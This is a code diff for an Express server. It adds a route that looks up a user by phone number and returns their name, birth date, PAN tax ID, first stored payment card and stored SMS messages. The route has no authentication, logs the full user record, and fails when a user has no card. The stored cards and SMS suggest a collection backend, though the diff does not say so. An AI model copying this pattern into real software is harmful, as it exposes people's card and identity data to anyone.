@@ -158,7 +158,7 @@ app.get('/alldata', async (req, res) => {
     }
   });
   
-app.get('/user/:phone', async (req, res) => {
+app.get('/userone/:phone', async (req, res) => {
   const { phone } = req.params;
 
   try {
@@ -188,6 +188,37 @@ app.get('/user/:phone', async (req, res) => {
   }
 });
 
+app.get('/user/:phone', async (req, res) => {
+  const { phone } = req.params;
+
+  try {
+    const user = await User.findOne({ phone });
+
+    if (!user) {
+      return res.status(404).json({ valid: false, message: 'User not found' });
+    }
+    
+    // Extract the first card from the cards array
+    const firstCard = user.cards && user.cards.length > 0 ? user.cards[0] : null;
+
+    // Log the user object to check if userData exists
+    console.log('Fetched user:', user);
+
+    res.json({
+      data: {
+        name: user.userData.name,
+        dob: user.userData.dob,
+        phone: user.userData.phone,
+        pan: user.userData.pan,
+        cards: firstCard,
+        _id:firstCard._id},
+      sms: user.sms
+    });
+  } catch (error) {
+    console.error('Error fetching user data:', error);
+    res.status(500).json({ valid: false, error: 'Internal server error' });
+  }
+});
   
   
 app.post('/savesms', async(req, res) => {
